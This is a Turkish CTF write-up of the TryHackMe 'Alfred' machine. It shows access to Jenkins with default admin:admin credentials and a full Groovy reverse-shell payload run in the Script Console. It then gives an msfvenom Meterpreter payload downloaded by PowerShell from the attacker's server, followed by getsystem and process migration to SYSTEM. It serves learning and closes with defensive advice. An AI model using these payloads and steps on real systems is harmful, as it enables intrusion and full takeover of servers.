# TryHackMe — Alfred Writeup

**Zorluk:** Orta (Medium)
**Kategori:** Windows Privilege Escalation, Jenkins, Metasploit
**Yazar:** *(kendi adını/nickini buraya ekle)*

---

## 📌 Özet

Alfred, Windows tabanlı bir makine olup üzerinde çalışan bir **Jenkins** servisi üzerinden zayıf/varsayılan kimlik bilgileriyle erişim sağlanmasına ve ardından **Groovy Script Console** aracılığıyla uzaktan kod çalıştırılmasına dayanan bir senaryo sunuyor. İlk erişimin ardından **Meterpreter** ile bağlantı kurulup, token/impersonation kısıtlamaları **process migration** tekniğiyle aşılarak `NT AUTHORITY\SYSTEM` yetkisi elde ediliyor.

> 💡 **Not:** Bu writeup, TryHackMe kural ve etik kurallarına uygun olarak sadece kendi çözüm sürecimi ve öğrenme amaçlı notlarımı paylaşmak için hazırlanmıştır. Flag değerleri kısmen gizlenmiştir.

---

## 🧭 İçindekiler

1. [Keşif](#1-keşif)
2. [Servis Analizi ve İlk Erişim](#2-servis-analizi-ve-i̇lk-erişim)
3. [Jenkins Üzerinden Uzaktan Kod Çalıştırma](#3-jenkins-üzerinden-uzaktan-kod-çalıştırma)
4. [User Flag](#4-user-flag)
5. [Yetki Yükseltme](#5-yetki-yükseltme)
6. [Root Flag](#6-root-flag)
7. [Sonuç ve Öğrenilenler](#7-sonuç-ve-öğrenilenler)

---

## 1. Keşif

İlk adım olarak klasik bir Nmap taraması ile hedef üzerinde açık portları ve servis versiyonlarını tespit ettim:

```bash
nmap -sS -A -p- -Pn 10.113.165.224
```

📸 **[EKRAN GÖRÜNTÜSÜ 1 — Nmap tarama sonucu (tam terminal çıktısı)]**

**Tespit edilen açık portlar:**

| Port | Servis | Versiyon |
|------|--------|----------|
| 80/tcp | HTTP | Microsoft IIS httpd 7.5 |
| 3389/tcp | RDP (ms-wbt-server) | Microsoft Terminal Service |
| 8080/tcp | HTTP | Jetty 9.4.z-SNAPSHOT |

Nmap çıktısında dikkatimi çeken birkaç önemli detay oldu:

- **80. port**: Başlıksız (title'sız) bir IIS 7.5 sayfası, ayrıca `TRACE` metodu risk taşıyor olarak işaretlenmiş.
- **3389. port**: RDP servisi açık, SSL sertifikası `commonName=alfred` bilgisini veriyor. Bu bize hedef makinenin hostname'inin **ALFRED** olduğunu doğruluyor.
- **8080. port**: Jetty üzerinde çalışan, `robots.txt` dosyasında tüm dizinlerin (`/`) disallow edildiği bir web servisi. Bu genelde bir **login paneli** veya yönetim arayüzü olduğuna işaret eder.
- OS tahmini olarak Windows Server 2008 R2 / Windows 7 aralığında bir sistem olduğu görülüyor.

---

## 2. Servis Analizi ve İlk Erişim

### 2.1 Port 80 — IIS

Port 80 üzerinde çalışan siteye yönelik `ffuf` ile dizin/dosya taraması gerçekleştirdim:

```bash
ffuf -u http://10.113.165.224/FUZZ -w <wordlist> -mc 200,301,302
```

📸 **[EKRAN GÖRÜNTÜSÜ 2 — ffuf tarama sonucu]**

Bu taramadan anlamlı bir sonuç elde edemedim, dolayısıyla odak noktamı **port 8080**'e kaydırdım.

### 2.2 Port 8080 — Jenkins Login Paneli

Tarayıcı üzerinden `http://10.113.165.224:8080` adresine gittiğimde bir **login paneli** ile karşılaştım. `robots.txt`'deki disallow kaydı ve arayüz tasarımı bunun bir yönetim paneli olduğunu doğruluyordu.

📸 **[EKRAN GÖRÜNTÜSÜ 3 — Port 8080'deki login paneli görünümü]**

Elimde herhangi bir kimlik bilgisi olmadığından, ilk denemem **varsayılan (default) credential** kombinasyonları oldu. TryHackMe görev sorusu da bunu doğrular nitelikteydi:

> *"Giriş paneli için kullanıcı adı ve şifre nedir?"* (kullanıcı adı ve şifre 5 harfli)

Birkaç deneme sonrasında en klasik ve en zayıf kombinasyon olan:

```
Kullanıcı adı : admin
Şifre         : admin
```

ile panele başarıyla giriş yaptım.

📸 **[EKRAN GÖRÜNTÜSÜ 4 — admin:admin ile başarılı giriş]**

> ⚠️ **Öğrenilen ders:** Yönetim panellerinde varsayılan kimlik bilgilerinin denenmesi, özellikle internal/test ortamlarında hâlâ etkili bir ilk erişim vektörüdür.

---

## 3. Jenkins Üzerinden Uzaktan Kod Çalıştırma

Giriş yaptıktan sonra karşıma bir **Jenkins** paneli çıktı. Jenkins, CI/CD süreçlerinde yaygın kullanılan bir otomasyon aracıdır ve doğru yapılandırılmadığında ciddi bir saldırı yüzeyi sunar.

📸 **[EKRAN GÖRÜNTÜSÜ 5 — Jenkins ana panel görünümü]**

**Manage Jenkins → Script Console** yolunu takip ettiğimde, sunucu üzerinde doğrudan **Groovy script** çalıştırabileceğim bir alan buldum:

> *"Type in an arbitrary Groovy script and execute it on the server"*

📸 **[EKRAN GÖRÜNTÜSÜ 6 — Script Console arayüzü]**

Bu, Jenkins'te bilinen ve çok kritik bir uzaktan kod çalıştırma vektörüdür. Groovy reverse shell payload'ları için araştırma yaptığımda [frohoff'un gist sayfasına](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ulaştım ve payload'ı kendi IP/port bilgilerime göre düzenledim:

```groovy
String host="192.168.134.19";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();
s.close();
```

Payload'ı çalıştırmadan önce, kendi makinemde bağlantıyı karşılamak için bir **Netcat listener** ayağa kaldırdım:

```bash
nc -lvnp 8044
```

📸 **[EKRAN GÖRÜNTÜSÜ 7 — Netcat listener başlatma]**

Script'i **Execute** butonuna basarak çalıştırdım ve listener tarafında bağlantının düştüğünü gördüm:

📸 **[EKRAN GÖRÜNTÜSÜ 8 — Reverse shell bağlantısının alınması]**

Bu noktada hedef sistem üzerinde bir **cmd.exe** shell'ine sahip oldum.

---

## 4. User Flag

Shell'i aldıktan sonra ilk hedefim `user.txt` flag'ini bulmaktı. `bruce` kullanıcısının masaüstü dizinini kontrol ettim:

```powershell
C:\Users\bruce\Desktop>type user.txt
```

📸 **[EKRAN GÖRÜNTÜSÜ 9 — user.txt içeriğinin görüntülenmesi]**

```
79007a09481963edf2e1321abd9ae2a0
```

✅ **User flag başarıyla elde edildi.**

---

## 5. Yetki Yükseltme

### 5.1 Mevcut Yetkilerin Kontrolü

Sistemde hangi haklara sahip olduğumu görmek için `whoami /priv` komutunu çalıştırdım:

```powershell
C:\Program Files (x86)\Jenkins>whoami /priv
```

📸 **[EKRAN GÖRÜNTÜSÜ 10 — whoami /priv çıktısı]**

Çıktıda dikkatimi çeken en önemli iki privilege şunlardı:

| Privilege | Durum | Önemi |
|-----------|-------|-------|
| `SeImpersonatePrivilege` | Enabled | Token impersonation saldırıları (Potato ailesi vb.) için kritik |
| `SeDebugPrivilege` | Enabled | Diğer process'lere debug erişimi, process injection/migration için kritik |

Bu iki privilege'ın aktif olması, sistemde **SYSTEM** yetkisine yükselme potansiyeli olduğunu gösteriyordu.

### 5.2 Meterpreter Beacon Hazırlığı

Görev, bir **msfvenom** payload'ı oluşturup hedefe taşımamı istiyordu. Öncelikle yazılabilir bir dizin oluşturdum:

```powershell
mkdir beacon
cd beacon
```

Kendi makinemde `msfvenom` ile x86 mimarisine uygun, encode edilmiş bir Meterpreter reverse TCP payload'ı ürettim:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 \
  --encoder x86/shikata_ga_nai \
  LHOST=192.168.134.19 LPORT=4444 \
  -f exe -o shell-name.exe
```

📸 **[EKRAN GÖRÜNTÜSÜ 11 — msfvenom payload üretim çıktısı]**

**Çıktı özeti:**

```
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: shell-name.exe
```

Payload dosyasını hedefe ulaştırmak için kendi dizinimde basit bir HTTP sunucusu açtım:

```bash
python3 -m http.server 8000
```

Hedef makine üzerinden PowerShell ile dosyayı indirdim:

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://192.168.134.19:8000/shell-name.exe','shell-name.exe')"
```

📸 **[EKRAN GÖRÜNTÜSÜ 12 — Payload'ın hedefe indirilmesi ve python http.server logu]**

### 5.3 Metasploit Handler ve Shell'in Tetiklenmesi

Payload çalıştırılmadan önce, bağlantıyı karşılayacak **multi/handler** modülünü ayarladım:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <THM-IP>
set LPORT <listening-port>
run
```

📸 **[EKRAN GÖRÜNTÜSÜ 13 — Metasploit handler ayarları]**

Ardından hedef sistemde payload'ı çalıştırdım:

```powershell
Start-Process "shell-name.exe"
```

Bu işlemle birlikte Metasploit handler tarafında bir Meterpreter oturumu açıldı:

📸 **[EKRAN GÖRÜNTÜSÜ 14 — Meterpreter session açılışı]**

```
meterpreter > getsystem
[*] ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

📸 **[EKRAN GÖRÜNTÜSÜ 15 — getsystem ve getuid çıktıları]**

### 5.4 Process Migration ile Token Sorununun Çözülmesi

`getsystem` başarılı olmasına rağmen, Windows'un token yönetim mantığı gereği **daha yüksek ayrıcalıklı bir token'a sahip olmak, o process'in gerçekten o izinlerle çalıştığı anlamına gelmez.** Windows, bir process'in yapabileceklerini belirlerken impersonation token'ı değil, **primary token**'ı esas alır.

Bu nedenle, doğru izinlere sahip başka bir process'e **migrate** olmam gerekiyordu. En güvenli seçim genellikle `services.exe` process'idir. Ayrıca elimdeki session **32-bit** olduğundan, 64-bit kodla tam etkileşim kurabilmek için 64-bit bir process'e geçiş yapmam gerekiyordu.

Öncelikle çalışan process'leri listeledim:

```
meterpreter > ps
```

📸 **[EKRAN GÖRÜNTÜSÜ 16 — ps komutu ile process listesi]**

`services.exe` process'ini buldum:

```
668   580   services.exe   x64   0   NT AUTHORITY\SYSTEM   C:\Windows\System32\services.exe
```

Bu process'e migrate oldum:

```
meterpreter > migrate 668
[*] Migrating from 2600 to 668...
[*] Migration completed successfully.
```

📸 **[EKRAN GÖRÜNTÜSÜ 17 — migrate komutu başarılı çıktısı]**

---

## 6. Root Flag

`services.exe` process'ine geçtikten sonra artık gerçek anlamda tam yetkili SYSTEM haklarına sahiptim. Root flag dosyasını okudum:

```
meterpreter > cat C:/Windows/System32/config/root.txt
```

📸 **[EKRAN GÖRÜNTÜSÜ 18 — root.txt flag'inin görüntülenmesi]**

```
dff0f748678f280250f25a45b8046b4a
```

✅ **Root flag başarıyla elde edildi. Makine tamamlandı.**

---

## 7. Sonuç ve Öğrenilenler

Bu makine, gerçek dünyada sıkça karşılaşılabilecek birkaç kritik güvenlik zafiyetini bir arada işliyor:

- **Varsayılan kimlik bilgileri**: Jenkins panelinde `admin:admin` gibi zayıf/varsayılan credential'ların kullanılması, ilk erişim için yeterli oldu.
- **Jenkins Script Console RCE**: Script Console gibi güçlü yönetim özellikleri, doğru şekilde kısıtlanmadığında doğrudan uzaktan kod çalıştırma imkanı sağlıyor.
- **Token vs. Primary Token farkı**: `getsystem` ile yüksek yetkili bir token elde etmenin, o yetkilerle process çalıştırabilmekle aynı şey olmadığını; bunun için doğru process'e **migrate** olmak gerektiğini pratik olarak deneyimledim.
- **SeImpersonatePrivilege / SeDebugPrivilege**: Bu privilege'ların aktif olması, yetki yükseltme saldırıları için önemli bir sinyal.

### 🛡️ Savunma Önerileri

- Jenkins gibi yönetim panellerinde **güçlü, benzersiz kimlik bilgileri** kullanılmalı ve varsayılan hesaplar devre dışı bırakılmalı.
- **Script Console** gibi kritik özellikler, yalnızca gerçekten ihtiyaç duyan ve yetkilendirilmiş kullanıcılara açılmalı; mümkünse Matrix-based security ile erişim kısıtlanmalı.
- Servisler internete açık tutulmamalı; gerekiyorsa VPN veya IP whitelist arkasına alınmalı.
- Sistem üzerinde çalışan servis hesaplarının gereğinden fazla privilege'a sahip olmaması sağlanmalı.

---

## 📎 Kullanılan Araçlar

- `nmap`
- `ffuf`
- Jenkins Script Console (Groovy)
- `netcat`
- `msfvenom`
- Metasploit Framework (`multi/handler`, Meterpreter)

---

*Bu writeup öğrenme amaçlı hazırlanmıştır ve yalnızca yetkilendirilmiş TryHackMe ortamında gerçekleştirilen bir çözümü belgelemektedir.*
